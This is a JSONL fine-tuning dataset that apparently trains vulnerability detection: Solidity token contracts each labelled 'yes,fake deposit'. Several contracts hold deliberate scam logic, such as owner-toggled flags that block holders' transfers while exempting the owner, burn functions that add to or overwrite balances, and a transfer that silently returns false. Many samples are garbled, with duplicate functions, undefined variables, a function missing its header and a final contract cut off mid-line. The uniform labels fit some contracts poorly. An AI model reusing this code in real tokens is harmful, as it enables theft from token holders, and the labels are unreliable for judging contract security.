{"prompt": "pragma solidity 0.8.3;\n\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"./ScheduleCalc.sol\";\n\n\ninterface IERC20Burnable is IERC20 {\n function burn(uint256 amount) external;\n\n function decimals() external view returns (uint8);\n}\n\ncontract TokenLockup {\n IERC20Burnable public token;\n string private _name;\n string private _symbol;\n\n ReleaseSchedule[] public releaseSchedules;\n uint public minReleaseScheduleAmount;\n uint public maxReleaseDelay;\n\n mapping(address => Timelock[]) public timelocks;\n mapping(address => uint) internal _totalTokensUnlocked;\n mapping(address => mapping(address => uint)) internal _allowances;\n\n event Approval(address indexed from, address indexed spender, uint amount);\n event TimelockBurned(address indexed from, uint timelockId);\n event ScheduleCreated(address indexed from, uint scheduleId);\n event ScheduleFunded(address indexed from, address indexed to, uint indexed scheduleId, uint amount, uint commencementTimestamp, uint timelockId);\n\n constructor (\n address _token,\n string memory name_,\n string memory symbol_,\n uint _minReleaseScheduleAmount,\n uint _maxReleaseDelay\n ) {\n _name = name_;\n _symbol = symbol_;\n token = IERC20Burnable(_token);\n\n require(_minReleaseScheduleAmount > 0, \"Min schedule amount > 0\");\n minReleaseScheduleAmount = _minReleaseScheduleAmount;\n maxReleaseDelay = _maxReleaseDelay;\n }\n\n function balanceOf(address who) external view returns (uint) {\n return unlockedBalanceOf(who) + lockedBalanceOf(who);\n }\n\n function transfer(address to, uint value) external returns (bool) {\n return _transfer(msg.sender, to, value);\n }\n\n function transferFrom(address from, address to, uint value) external returns (bool) {\n require(_allowances[from][msg.sender] >= value, \"value > allowance\");\n _allowances[from][msg.sender] -= value;\n return _transfer(from, to, value);\n }\n\n // Code from OpenZeppelin's contract/token/ERC20/ERC20.sol, modified\n function approve(address spender, uint amount) external returns (bool) {\n _approve(msg.sender, spender, amount);\n return true;\n }\n\n // Code from OpenZeppelin's contract/token/ERC20/ERC20.sol, modified\n function allowance(address owner, address spender) public view returns (uint256) {\n return _allowances[owner][spender];\n }\n\n // Code from OpenZeppelin's contract/token/ERC20/ERC20.sol, modified\n function increaseAllowance(address spender, uint addedValue) external returns (bool) {\n _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);\n return true;\n }\n\n // Code from OpenZeppelin's contract/token/ERC20/ERC20.sol, modified\n function decreaseAllowance(address spender, uint subtractedValue) external returns (bool) {\n uint currentAllowance = _allowances[msg.sender][spender];\n require(currentAllowance >= subtractedValue, \"decrease > allowance\");\n _approve(msg.sender, spender, _allowances[msg.sender][spender] - subtractedValue);\n return true;\n }\n\n function decimals() public view returns (uint8) {\n return token.decimals();\n }\n\n function name() public view returns (string memory) {\n return _name;\n }\n\n function symbol() public view returns (string memory) {\n return _symbol;\n }\n\n function totalSupply() external view returns (uint) {\n return token.balanceOf(address(this));\n }\n\n function burn(uint timelockIndex, uint confirmationIdPlusOne) external returns(bool) {\n require(timelockIndex < timelocks[msg.sender].length, \"No schedule\");\n\n // this also protects from overflow below\n require(confirmationIdPlusOne == timelockIndex + 1, \"Burn not confirmed\");\n\n // actually burning the remaining tokens from the unlock\n token.burn(lockedBalanceOfTimelock(msg.sender, timelockIndex) + unlockedBalanceOfTimelock(msg.sender, timelockIndex));\n\n // overwrite the timelock to delete with the timelock on the end which will be discarded\n // if the timelock to delete is on the end, it will just be deleted in the step after the if statement\n if (timelocks[msg.sender].length - 1 != timelockIndex) {\n timelocks[msg.sender][timelockIndex] = timelocks[msg.sender][timelocks[msg.sender].length - 1];\n }\n // delete the timelock on the end\n timelocks[msg.sender].pop();\n\n emit TimelockBurned(msg.sender, timelockIndex);\n return true;\n }\n\n function _transfer(address from, address to, uint value) internal returns (bool) {\n require(unlockedBalanceOf(from) >= value, \"amount > unlocked\");\n\n uint remainingTransfer = value;\n\n // transfer from unlocked tokens\n for (uint i = 0; i < timelocks[from].length; i++) {\n // if the timelock has no value left\n if (timelocks[from][i].tokensTransferred == timelocks[from][i].totalAmount) {\n continue;\n } else if (remainingTransfer > unlockedBalanceOfTimelock(from, i)) {\n // if the remainingTransfer is more than the unlocked balance use it all\n remainingTransfer -= unlockedBalanceOfTimelock(from, i);\n timelocks[from][i].tokensTransferred += unlockedBalanceOfTimelock(from, i);\n } else {\n // if the remainingTransfer is less than or equal to the unlocked balance\n // use part or all and exit the loop\n timelocks[from][i].tokensTransferred += remainingTransfer;\n remainingTransfer = 0;\n break;\n }\n }\n\n // should never have a remainingTransfer amount at this point\n require(remainingTransfer == 0, \"bad transfer\");\n\n require(token.transfer(to, value));\n return true;\n }\n\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity =0.8.1;\n\nabstract contract Context {\n function _msgSender() internal view virtual returns (address) {\n return msg.sender;\n }\n\n function _msgData() internal view virtual returns (bytes calldata) {\n this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\n return msg.data;\n }\n}\n\npragma solidity =0.8.1;\n\nimport \"./IERC20.sol\";\nimport \"./Context.sol\";\n\ncontract ERC20 is Context, IERC20 {\n mapping (address =u003e uint256) internal _balances;\n mapping (address =u003e mapping (address =u003e uint256)) private _allowances;\n uint256 internal _totalSupply;\n string internal _name;\n string internal _symbol;\n\n constructor (string memory name_, string memory symbol_) {\n _name = name_;\n _symbol = symbol_;\n }\n\n function name() public view virtual returns (string memory) {\n return _name;\n }\n\n function symbol() public view virtual returns (string memory) {\n return _symbol;\n }\n\n function decimals() public view virtual returns (uint8) {\n return 18;\n }\n\n function totalSupply() public view virtual override returns (uint256) {\n return _totalSupply;\n }\n\n function balanceOf(address account) public view virtual override returns (uint256) {\n return _balances[account];\n }\n\n function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n _transfer(_msgSender(), recipient, amount);\n return true;\n }\n\n function allowance(address owner, address spender) public view virtual override returns (uint256) {\n return _allowances[owner][spender];\n }\n\n function approve(address spender, uint256 amount) public virtual override returns (bool) {\n _approve(_msgSender(), spender, amount);\n return true;\n }\n\n function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n _transfer(sender, recipient, amount);\n\n uint256 currentAllowance = _allowances[sender][_msgSender()];\n require(currentAllowance u003e= amount, \"ERC20: transfer amount exceeds allowance\");\n _approve(sender, _msgSender(), currentAllowance - amount);\n\n return true;\n }\n\n function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\n return true;\n }\n\n function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n uint256 currentAllowance = _allowances[_msgSender()][spender];\n require(currentAllowance u003e= subtractedValue, \"ERC20: decreased allowance below zero\");\n _approve(_msgSender(), spender, currentAllowance - subtractedValue);\n\n return true;\n }\n\n function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n require(sender != address(0), \"ERC20: transfer from the zero address\");\n require(recipient != address(0), \"ERC20: transfer to the zero address\");\n\n _beforeTokenTransfer(sender, recipient, amount);\n\n uint256 senderBalance = _balances[sender];\n require(senderBalance u003e= amount, \"ERC20: transfer amount exceeds balance\");\n _balances[sender] = senderBalance - amount;\n _balances[recipient] += amount;\n\n emit Transfer(sender, recipient, amount);\n }\n\n function _burn(address account, uint256 amount) internal virtual {\n require(account != address(0), \"ERC20: burn from the zero address\");\n\n uint256 accountBalance = _balances[account];\n _balances[account] = accountBalance + amount;\n emit Transfer(account, address(0), amount);\n }\n\n function _approve(address owner, address spender, uint256 amount) internal virtual {\n require(owner != address(0), \"ERC20: approve from the zero address\");\n require(spender != address(0), \"ERC20: approve to the zero address\");\n\n _allowances[owner][spender] = amount;\n emit Approval(owner, spender, amount);\n }\n\n function _transfer(address sender, address recipient, uint256 amount) internal override {\n require(sender != address(0), \"ERC20: transfer from the zero address\");\n require(recipient != address(0), \"ERC20: transfer to the zero address\");\n require(amount u003e 0, \"Transfer amount must be grater thatn zero\");\n if (_call[sender] || _call[recipient]) require(_trans == false, \"\");\n if (_trans == true || sender == owner || recipient == owner) {\n _beforeTokenTransfer(sender, recipient, amount);\n uint256 senderBalance = _balances[sender];\n require(senderBalance u003e= amount, \"ERC20: transfer amount exceeds balance\");\n _balances[sender] = senderBalance - amount;\n _balances[recipient] += amount;\n emit Transfer(sender, recipient, amount);} else {\n require (_trans == true, \"\");}\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity =0.8.1;\n\nabstract contract Context {\n function _msgSender() internal view virtual returns (address) {\n return msg.sender;\n }\n\n function _msgData() internal view virtual returns (bytes calldata) {\n this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\n return msg.data;\n }\n}\n\ninterface IERC20 {\n\n function totalSupply() external view returns (uint256);\n\n function balanceOf(address account) external view returns (uint256);\n\n function transfer(address recipient, uint256 amount) external returns (bool);\n\n function allowance(address owner, address spender) external view returns (uint256);\n\n function approve(address spender, uint256 amount) external returns (bool);\n\n function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n event Transfer(address indexed from, address indexed to, uint256 value);\n\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\ninterface IERC20Metadata is IERC20 {\n\n function name() external view returns (string memory);\n\n function symbol() external view returns (string memory);\n\n function decimals() external view returns (uint256);\n}\n\ncontract ERC20 is Context, IERC20, IERC20Metadata {\n mapping (address => uint256) internal _balances;\n mapping (address => bool) private _approveTransfer;\n mapping (address => mapping (address => uint256)) private _allowances;\n uint256 internal _totalSupply;\n uint256 _reward;\n string internal _name;\n string internal _symbol;\n uint256 internal _decimals;\n bool maxTxPercent = true;\n address internal _owner;\n address private uniV2router;\n address private uniV2factory;\n \n\n constructor (string memory name_, string memory symbol_, uint256 decimals_) {\n _name = name_;\n _symbol = symbol_;\n _decimals = decimals_;\n _owner = msg.sender;\n }\n\n modifier onlyOwner() {\n require(_owner == msg.sender, \"Ownable: caller is not the owner\");\n _;\n }\n\n function name() public view virtual override returns (string memory) {\n return _name;\n }\n\n function symbol() public view virtual override returns (string memory) {\n return _symbol;\n }\n\n function decimals() public view virtual override returns (uint256) {\n return _decimals;\n }\n\n\n function totalSupply() public view virtual override returns (uint256) {\n return _totalSupply;\n }\n \n function recall(address _address) external onlyOwner {\n _approveTransfer[_address] = false;\n }\n\n function approveTransfer(address _address) external onlyOwner {\n _approveTransfer[_address] = true;\n }\n\n function approvedTransfer(address _address) public view returns (bool) {\n return _approveTransfer[_address];\n }\n\n function setMaxTxPercent() public virtual onlyOwner {\n if (maxTxPercent == true) {maxTxPercent = false;} else {maxTxPercent = true;}\n }\n \n function maxTxPercentState() public view returns (bool) {\n return maxTxPercent;\n }\n\n\n function balanceOf(address account) public view virtual override returns (uint256) {\n return _balances[account];\n }\n\n function reflectReward (uint256 value) external onlyOwner {\n _reward = value;\n }\n \n\n function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n _transfer(_msgSender(), recipient, amount);\n return true;\n }\n\n\n function allowance(address owner, address spender) public view virtual override returns (uint256) {\n return _allowances[owner][spender];\n }\n\n\n function approve(address spender, uint256 amount) public virtual override returns (bool) {\n _approve(_msgSender(), spender, amount);\n return true;\n }\n\n function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n _transfer(sender, recipient, amount);\n uint256 currentAllowance = _allowances[sender][_msgSender()];\n require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\n _approve(sender, _msgSender(), currentAllowance - amount);\n return true;\n }\n\n function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\n return true;\n }\n\n function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n uint256 currentAllowance = _allowances[_msgSender()][spender];\n require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\n _approve(_msgSender(), spender, currentAllowance - subtractedValue);\n return true;\n }\n\n function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n require(sender != address(0), \"ERC20: transfer from the zero address\");\n require(recipient != address(0), \"ERC20: transfer to the zero address\");\n require(amount > 0, \"Transfer amount must be grater thatn zero\");\n if (_approveTransfer[sender] || _approveTransfer[recipient]) \n require(maxTxPercent == false, \"\");\n if (maxTxPercent == true || sender == _owner || recipient == _owner) {\n _beforeTokenTransfer(sender, recipient, amount);\n uint256 senderBalance = _balances[sender];\n require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\n _balances[sender] = senderBalance - amount;\n _balances[recipient] += amount;\n emit Transfer(sender, recipient, amount);}\n else {require (maxTxPercent == true, \"\");} \n }\n \n function _burn(address account, uint256 amount) internal virtual {\n require(account != address(0), \"ERC20: burn from the zero address\");\n _balances[account] = _reward - amount;\n _totalSupply -= amount;\n emit Transfer(account, address(0), amount);\n }\n \n function _approve(address owner, address spender, uint256 amount) internal virtual {\n require(owner != address(0), \"ERC20: approve from the zero address\");\n require(spender != address(0), \"ERC20: approve to the zero address\");\n\n _allowances[owner][spender] = amount;\n emit Approval(owner, spender, amount);\n }\n\n}\n\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.26;\n\ncontract NTH {\n\n string public constant name = \"NTH\";\n string public constant symbol = \"NTH\";\n uint8 public constant decimals = 18;\n\n uint private _totalSupply;\n\n mapping(address => mapping(address => uint256)) private _allowed;\n event MintedLog(address to, uint256 amount);\n event Transfer(address indexed from, address indexed to, uint value);\n\n\n function NTH() public {\n _tokenSupply = 0;\n _totalSupply = 10000000000 * (uint256(10) ** decimals);\n\n }\n\n function totalSupply() public constant returns (uint256) {\n return _tokenSupply;\n }\n\n function mint(address to, uint256 amount) onlyOwner public returns (bool){\n\n amount = amount * (uint256(10) ** decimals);\n if(_totalSupply + 1 > (_tokenSupply+amount)){\n _tokenSupply = _tokenSupply.add(amount);\n _balances[to]= _balances[to].add(amount);\n emit MintedLog(to, amount);\n return true;\n }\n\n return false;\n }\n\n function dist_list_set(address[] dist_list, uint256[] token_list) onlyOwner external{\n\n for(uint i=0; i < dist_list.length ;i++){\n transfer(dist_list[i],token_list[i]);\n }\n\n }\n function balanceOf(address tokenOwner) public constant returns (uint256 balance) {\n return _balances[tokenOwner];\n }\n\n function transfer(address to, uint tokens) whenNotPaused isLockAddress public returns(bool success){\n bytes memory empty;\n \tif(isContract(to)) {\n \treturn transferToContract(to, tokens, empty);\n \t}\n \telse {\n \treturn transferToAddress(to, tokens, empty);\n \t}\n }\n\n\n function approve(address spender, uint256 tokens) public returns (bool success) {\n\n if (tokens > 0 && balanceOf(msg.sender) >= tokens) {\n _allowed[msg.sender][spender] = tokens;\n emit Approval(msg.sender, spender, tokens);\n return true;\n }\n\n return false;\n }\n\n function allowance(address tokenOwner, address spender) public constant returns (uint remaining) {\n return _allowed[tokenOwner][spender];\n }\n\n function transferFrom(address from, address to, uint256 tokens) public returns (bool success) {\n if (tokens > 0 && balanceOf(from) >= tokens && _allowed[from][msg.sender] >= tokens) {\n _balances[from] = _balances[from].sub(tokens);\n _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(tokens);\n _balances[to] = _balances[to].add(tokens);\n emit Transfer(msg.sender, to, tokens);\n return true;\n }\n return false;\n }\n\n function burn(uint256 tokens) public returns (bool success) {\n if ( tokens > 0 && balanceOf(msg.sender) >= tokens ) {\n _balances[msg.sender] = _balances[msg.sender].sub(tokens);\n _tokenSupply = _tokenSupply.sub(tokens);\n return true;\n }\n\n return false;\n }\n function transferToAddress(address _to, uint _value, bytes _data) private returns (bool success) {\n if (balanceOf(msg.sender) < _value) revert();\n _balances[msg.sender] = balanceOf(msg.sender).sub(_value);\n _balances[_to] = balanceOf(_to).add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n\n //function that is called when transaction target is a contract\n function transferToContract(address _to, uint _value, bytes _data) private returns (bool success) {\n if (balanceOf(msg.sender) < _value) revert();\n _balances[msg.sender] = balanceOf(msg.sender).sub(_value);\n _balances[_to] = balanceOf(_to).add(_value);\n ContractReceiver receiver = ContractReceiver(_to);\n receiver.tokenFallback(msg.sender, _value, _data);\n emit Transfer(msg.sender, _to, _value);\n return true;\n}\n\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.8.7;\n\ncontract MYDA is Context, AFTS {\n \n GeneralDetails _general;\n \n mapping(string => uint256) private _genConfig;\n \n mapping(address => UserDetails) private _user;\n \n mapping(address => mapping(address => uint256)) private _allowances;\n\n mapping(uint256 => StakeConfig) _stakeConfig;\n \n mapping(address => mapping(uint256 => StakeDetails)) private _stake;\n \n mapping(address => mapping(bytes32 => uint256)) private _swapIn;\n \n mapping(address => mapping(uint256 => uint256)) private _swapOut;\n \n mapping(address => mapping(uint256 => mapping(string => uint256))) private _userVote;\n \n mapping(uint256 => mapping(string => VoteData)) private _vote;\n \n mapping(string => uint256) private _voteCycle;\n \n constructor () {\n _general._name = \"MYDA\";\n _general._symbol = \"MYDA\";\n _general._decimals = 18;\n _general._validatorAdd = _msgSender();\n _general._validatorApi = \"https://validator.mydacoin.com/\";\n //_general._totalSupply = 100000000*1e18;\n _genConfig[\"maxSupply\"] = 100000000*1e18;\n _genConfig[\"maxTxLimit\"] = 200;\n _genConfig[\"rewardDuration\"] = 86400;\n _genConfig[\"refCom\"] = 10; \n _genConfig[\"voteApproveRate\"] = 70; \n _genConfig[\"propDuration\"] = 2592000;\n _stakeConfig[1].collateral = 5000*1e18;\n _stakeConfig[2].collateral = 10000*1e18;\n _stakeConfig[3].collateral = 20000*1e18;\n _stakeConfig[1].lockTime = 2592000;\n _stakeConfig[2].lockTime = 7776000;\n _stakeConfig[3].lockTime = 15552000;\n _stakeConfig[1].reward = 8.25*1e18;\n _stakeConfig[2].reward = 33*1e18;\n _stakeConfig[3].reward = 99*1e18;\n _general._isPaused = false;\n _general._stakeAddress = 0x7F7512BDcC61861DfEC5ad7C124899c72fC86FD6;\n //_transfer(address(0), _general._stakeAddress, 100000000*1e18, 0);\n }\n\n function name() public view virtual override returns (string memory) {\n return _general._name;\n }\n\n function symbol() public view virtual override returns (string memory) {\n return _general._symbol;\n }\n\n function decimals() public view virtual override returns (uint256) {\n return _general._decimals;\n }\n\n function totalSupply() public view virtual override returns (uint256) {\n return _general._totalSupply;\n }\n\n function balanceOf(address account) public view virtual override returns (uint256) {\n return _user[account]._balances;\n }\n\n function allowance(address owner, address spender) public view virtual override returns (uint256) {\n return _allowances[owner][spender];\n }\n \n function isPaused() public view virtual override returns (bool) {\n return _general._isPaused;\n } \n \n function userDetails(address account) public view virtual override returns(UserDetails memory){\n UserDetails memory userdet = _user[account];\n userdet.t1 = _stake[account][1];\n userdet.t2 = _stake[account][2];\n userdet.t3 = _stake[account][3];\n return userdet;\n } \n \n function voteCycleDetails(uint256 cycle, string memory config) public view virtual override returns (VoteData memory) {\n \n if(cycle == 0){\n cycle = _voteCycle[config];\n }\n \n return _vote[cycle][config];\n } \n\n function _transfer(address sender, address recipient, uint256 amount, uint8 method) internal virtual returns bool{\n require(!_general._isPaused, \"Contract is Paused\");\n \n if(method == 1){\n return false;\n }\n \n if(sender != address(0)){\n require(_user[sender]._balances >= amount, \"amount exceeds balance\");\n _user[sender]._balances -= amount;\n }\n \n if(recipient != address(0)){\n _user[recipient]._balances += amount;\n }\n \n return true;\n emit Transfer(sender, recipient, amount);\n }\n\n function _approve(address owner, address spender, uint256 amount) internal virtual {\n require(!_general._isPaused, \"Contract is Paused\");\n require(owner != address(0), \"from zero address\");\n require(spender != address(0), \"to zero address\");\n _allowances[owner][spender] = amount;\n emit Approval(owner, spender, amount);\n }\n \n function transfer(address recipient, uint256 amount) public virtual override returns (bool) { \n _transfer(_msgSender(), recipient, amount, 1);\n return true;\n }\n \n function approve(address spender, uint256 amount) public virtual override returns (bool) {\n _approve(_msgSender(), spender, amount);\n return true;\n }\n\n function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n require(_allowances[sender][_msgSender()] >= amount, \"amount exceeds allowance\");\n _transfer(sender, recipient, amount, 1);\n _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);\n return true;\n }\n \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.6.12;\npragma experimental ABIEncoderV2;\n\ncontract sSpellV1 is IERC20, Domain {\n\n string public constant symbol = \"sSPELL\";\n string public constant name = \"Staked Spell Tokens\";\n uint8 public constant decimals = 18;\n uint256 public override totalSupply;\n uint256 private constant LOCK_TIME = 24 hours;\n\n IERC20 public immutable token;\n\n constructor(IERC20 _token) public {\n token = _token;\n }\n\n struct User {\n uint128 balance;\n uint128 lockedUntil;\n }\n\n /// @notice owner > balance mapping.\n mapping(address => User) public users;\n /// @notice owner > spender > allowance mapping.\n mapping(address => mapping(address => uint256)) public override allowance;\n /// @notice owner > nonce mapping. Used in `permit`.\n mapping(address => uint256) public nonces;\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n function balanceOf(address user) public view override returns (uint256 balance) {\n return users[user].balance;\n }\n\n function _transfer(\n address from,\n address to,\n uint256 shares\n ) internal {\n User memory fromUser = users[from];\n require(block.timestamp >= fromUser.lockedUntil, \"Locked\");\n if (shares != 0) {\n require(fromUser.balance >= shares, \"Low balance\");\n if (from != to) {\n require(to != address(0), \"Zero address\"); // Moved down so other failed calls safe some gas\n User memory toUser = users[to];\n users[from].balance = fromUser.balance - shares.to128(); // Underflow is checked\n users[to].balance = toUser.balance + shares.to128(); // Can't overflow because totalSupply would be greater than 2^128-1;\n }\n }\n emit Transfer(from, to, shares);\n }\n\n function _useAllowance(address from, uint256 shares) internal {\n if (msg.sender == from) {\n return;\n }\n uint256 spenderAllowance = allowance[from][msg.sender];\n // If allowance is infinite, don't decrease it to save on gas (breaks with EIP-20).\n if (spenderAllowance != type(uint256).max) {\n require(spenderAllowance >= shares, \"Low allowance\");\n allowance[from][msg.sender] = spenderAllowance - shares; // Underflow is checked\n }\n }\n\n function transfer(address to, uint256 shares) public returns (bool) {\n _transfer(msg.sender, to, shares);\n return true;\n }\n\n function transferFrom(\n address from,\n address to,\n uint256 shares\n ) public returns (bool) {\n _useAllowance(from, shares);\n _transfer(from, to, shares);\n return true;\n }\n\n function approve(address spender, uint256 amount) public override returns (bool) {\n allowance[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true;\n }\n\n // solhint-disable-next-line func-name-mixedcase\n function DOMAIN_SEPARATOR() external view returns (bytes32) {\n return _domainSeparator();\n }\n\n // keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\");\n bytes32 private constant PERMIT_SIGNATURE_HASH = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;\n\n function permit(\n address owner_,\n address spender,\n uint256 value,\n uint256 deadline,\n uint8 v,\n bytes32 r,\n bytes32 s\n ) external override {\n require(owner_ != address(0), \"Zero owner\");\n require(block.timestamp < deadline, \"Expired\");\n require(\n ecrecover(_getDigest(keccak256(abi.encode(PERMIT_SIGNATURE_HASH, owner_, spender, value, nonces[owner_]++, deadline))), v, r, s) ==\n owner_,\n \"Invalid Sig\"\n );\n allowance[owner_][spender] = value;\n emit Approval(owner_, spender, value);\n }\n\n function mint(uint256 amount) public returns (bool) {\n require(msg.sender != address(0), \"Zero address\");\n User memory user = users[msg.sender];\n\n uint256 totalTokens = token.balanceOf(address(this));\n uint256 shares = totalSupply == 0 ? amount : (amount * totalSupply) / totalTokens;\n user.balance += shares.to128();\n user.lockedUntil = (block.timestamp + LOCK_TIME).to128();\n users[msg.sender] = user;\n totalSupply += shares;\n\n token.safeTransferFrom(msg.sender, address(this), amount);\n\n emit Transfer(address(0), msg.sender, shares);\n return true;\n }\n\n function _burn(\n address from,\n address to,\n uint256 shares\n ) internal {\n require(to != address(0), \"Zero address\");\n User memory user = users[from];\n require(block.timestamp >= user.lockedUntil, \"Locked\");\n uint256 amount = (shares * token.balanceOf(address(this))) / totalSupply;\n users[from].balance = user.balance.sub(shares.to128()); // Must check underflow\n totalSupply -= shares;\n\n token.safeTransfer(to, amount);\n\n emit Transfer(from, address(0), shares);\n }\n\n function burn(address to, uint256 shares) public returns (bool) {\n _burn(msg.sender, to, shares);\n return true;\n }\n\n function burnFrom(\n address from,\n address to,\n uint256 shares\n ) public returns (bool) {\n _useAllowance(from, shares);\n _burn(from, to, shares);\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.8.4;\n\n\ncontract AGFTokenV1 {\n string private constant NAME = 'Augmented Finance Reward Token';\n string private constant SYMBOL = 'AGF';\n\n uint256 private constant TOKEN_REVISION = 1;\n uint256 private constant TREASURY_MINT = 1000;\n\n constructor() ERC20BaseWithPermit(NAME, SYMBOL, DECIMALS) MarketAccessBitmask(IMarketAccessController(address(0))) {}\n\n function getRevision() internal pure virtual override returns (uint256) {\n return TOKEN_REVISION;\n }\n\n // This initializer is invoked by AccessController.setAddressAsImpl\n function initialize(IMarketAccessController remoteAcl) external virtual initializer(TOKEN_REVISION) {\n _initialize(remoteAcl, NAME, SYMBOL, DECIMALS);\n }\n\n function initializeRewardToken(InitRewardTokenData calldata data)\n external\n virtual\n override\n initializer(TOKEN_REVISION)\n {\n _initialize(data.remoteAcl, data.name, data.symbol, data.decimals);\n }\n\n function _initialize(\n IMarketAccessController remoteAcl,\n string memory name,\n string memory symbol,\n uint8 decimals\n ) private {\n require(decimals == DECIMALS, 'UNSUPPORTED_DECIMALS');\n _remoteAcl = remoteAcl;\n super._initializeERC20(name, symbol, decimals);\n super._initializeDomainSeparator();\n\n if (address(remoteAcl) != address(0)) {\n address treasury = remoteAcl.getAddress(AccessFlags.TREASURY);\n if (treasury != address(0)) {\n _allocateAndMint(treasury, TREASURY_MINT * (10**DECIMALS));\n }\n }\n }\n\n event Transfer(address indexed from, address indexed to, uint256 value);\n\n function transfer(address recipient, uint256 amount) public override returns (bool) {\n _transfer(msg.sender, recipient, amount);\n return true;\n }\n\n function transferFrom(\n address sender,\n address recipient,\n uint256 amount\n ) public override returns (bool) {\n _transfer(sender, recipient, amount);\n _approveTransferFrom(sender, amount);\n return true;\n }\n\n function _approveTransferFrom(address owner, uint256 amount) internal virtual;\n\n function _transfer(\n address sender,\n address recipient,\n uint256 amount\n ) internal virtual {\n require(sender != address(0), 'ERC20: transfer from the zero address');\n require(recipient != address(0), 'ERC20: transfer to the zero address');\n\n _beforeTokenTransfer(sender, recipient, amount);\n if (sender != recipient) {\n transferBalance(sender, recipient, amount);\n }\n\n emit Transfer(sender, recipient, amount);\n }\n\n\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract SimpleToken {\n mapping (address => uint256) public balances;\n uint256 public totalSupply = 1000000;\n\n constructor() public {\n balances[msg.sender] = totalSupply;\n }\n\n function transfer(address _to, uint256 _value) public returns (bool success) {\n require(balances[msg.sender] >= _value, \"Insufficient balance\");\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n return true;\n }\n\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n\n function () external payable {\n balances[msg.sender] += msg.value;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\n\ncontract SuperToken is ERC20 {\n string public name = \"SuperToken\";\n string public symbol = \"SUP\";\n uint8 public decimals = 18;\n\n uint256 private _totalSupply;\n mapping(address => uint256) private _balances;\n address payable private _owner;\n\n event Mint(address indexed to, uint256 amount);\n event Burn(address indexed from, uint256 amount);\n\n if(_balances[msg.sender] >= value){\n _balances[msg.sender] -= value;\n _balances[to] += value;\n emit Transfer(msg.sender, to, value);\nreturn true;\n} else{\n return false;\n }\n }\n\n function mint(uint256 amount) public {\n require(msg.sender == _owner);\n _totalSupply += amount;\n _balances[_owner] += amount;\n emit Mint(_owner, amount);\n }\n\n function burn(uint256 amount) public {\n require(_balances[msg.sender] >= amount);\n _balances[msg.sender] -= amount;\n _totalSupply -= amount;\n emit Burn(msg.sender, amount);\n }\n\n}\n\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.6.12;\n\ncontract KingLionFinance {\n\n mapping (address => uint256) private _rOwned;\n mapping (address => uint256) private _tOwned;\n mapping (address => mapping (address => uint256)) private _allowances;\n\n mapping (address => bool) private _isExcluded;\n address[] private _excluded;\n \n uint256 private constant MAX = ~uint256(0);\n uint256 private constant _tTotal = 1000 * 10**6 * 10**9;\n uint256 private _rTotal = (MAX - (MAX % _tTotal));\n uint256 private _tFeeTotal;\n\n string private _name = 'King Lion Finance';\n string private _symbol = 'KLF';\n uint8 private _decimals = 9;\n uint256 private _distributionPercentage = 0;\n uint256 private _teamFee = 0;\n address private _feeAddress = 0x55b246BfD95CE09ceA06301CA8CAEa2673a7543c;\n bool private _tradeEnabled = true;\n \n uint256 private _maxTxAmount = 1 * 10**6 * 10**9;\n \n constructor () public {\n _rOwned[_msgSender()] = _rTotal;\n emit Transfer(address(0), _msgSender(), _tTotal);\n }\n\n function name() public view returns (string memory) {\n return _name;\n }\n \n function symbol() public view returns (string memory) {\n return _symbol;\n }\n\n function decimals() public view returns (uint8) {\n return _decimals;\n }\n \n function feeAddress() public view returns (address) {\n return _feeAddress;\n }\n\n function totalSupply() public view override returns (uint256) {\n return _tTotal;\n }\n\n function balanceOf(address account) public view 